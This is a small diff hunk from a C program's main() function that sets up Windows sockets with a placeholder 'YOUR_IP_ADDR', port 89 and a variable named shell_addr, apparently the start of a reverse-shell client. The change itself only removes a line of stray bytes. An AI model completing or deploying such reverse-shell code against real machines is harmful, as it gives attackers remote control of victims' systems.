@@ -12,7 +12,7 @@ int main()
 
     char ip_addr[] = "YOUR_IP_ADDR";
     int port = 89;
-€ý,€ý,
+
     WSAStartup(MAKEWORD(2,2), &wsa);
 
     shell_addr.sin_port = htons(port);
